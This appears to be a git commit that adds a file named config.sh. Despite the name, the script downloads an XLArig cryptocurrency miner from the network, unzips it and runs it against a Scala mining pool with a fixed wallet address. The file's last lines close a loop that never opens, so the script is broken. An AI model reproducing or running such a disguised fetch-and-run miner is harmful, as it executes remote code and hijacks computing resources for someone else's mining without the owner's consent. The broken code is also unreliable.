3e9f1e77cb8ade9b92d2e553844143ae1e0ce721
hendrosua <86714490+hendrosua@users.noreply.github.com>
2021-06-30 17:25:24 +0800

    Create config.sh

---
+++ config.sh
@@ -0,0 +1,5 @@
+wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o scala.herominers.com:10131 -u Ssy2CNw8yUdV6BeS75vHod8V9ZYk1RZxnTveg8f4DTrjLJhqn8yfSdBJfvEyrDtc7gKWDmSiwyKttEbvZfjs6X1P2czySJrRn6 -p budug1 -a panthera -k -t2
+ 
+     echo COUNTER $COUNTER
+     let COUNTER-=1
+done
